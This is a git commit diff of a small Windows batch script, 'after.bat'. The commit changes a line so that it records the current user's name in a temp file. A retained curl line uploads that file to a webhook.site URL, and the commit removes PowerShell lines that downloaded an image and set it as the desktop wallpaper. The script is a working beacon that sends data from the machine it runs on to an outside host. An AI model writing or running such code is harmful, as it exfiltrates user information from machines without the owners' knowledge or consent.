5df1c503ee35624065dbd2cc5978a510945f6c98
Sajid Alam <117466907+mohammadsajidalam@users.noreply.github.com>
2023-07-15 22:59:57 +0530

    Update after.bat
    Simple UPDATES

--- after.bat
+++ after.bat
@@ -1,4 +1,3 @@
-echo THE WALLPAPAER CODE RAN SUCCESSFULLY :-) > %temp%\info.txt
+echo The Code RAN Successfully In %USERNAME% > %temp%\info.txt
 curl -T "%temp%/info.txt" "https://webhook.site/3eddd305-811f-4430-83dc-4bad466db906"
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://i.ibb.co/y6T1rgs/Wallpaper.png', '%TEMP%\wallpaper.jpg')" & powershell -Command "Set-ItemProperty -path 'HKCU:\Control Panel\Desktop' -name Wallpaper -value '%TEMP%\wallpaper.jpg'" & powershell -Command "RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"
 
